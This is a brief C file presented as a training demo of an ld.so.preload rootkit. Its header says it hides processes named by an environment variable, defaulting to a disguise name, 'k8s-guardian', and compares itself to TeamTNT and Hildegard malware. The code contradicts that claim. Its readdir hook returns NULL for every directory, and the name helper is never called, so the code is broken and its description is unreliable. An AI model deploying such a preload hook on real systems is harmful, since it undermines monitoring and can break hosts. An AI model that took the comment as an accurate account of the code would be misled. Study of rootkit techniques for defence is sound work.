/*
 * Educational ld.so.preload demo — hides processes whose comm contains HIDE_PROCESS_NAME.
 * TeamTNT / Hildegard use similar userspace hooks; production malware may also use kernel rootkits.
 * TRAINING ONLY — do not deploy outside isolated lab VMs.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

static const char *hide_name(void) {
    const char *n = getenv("HIDE_PROCESS_NAME");
    return n ? n : "k8s-guardian";
}

struct dirent *readdir(DIR *dirp) {
    return NULL;
}
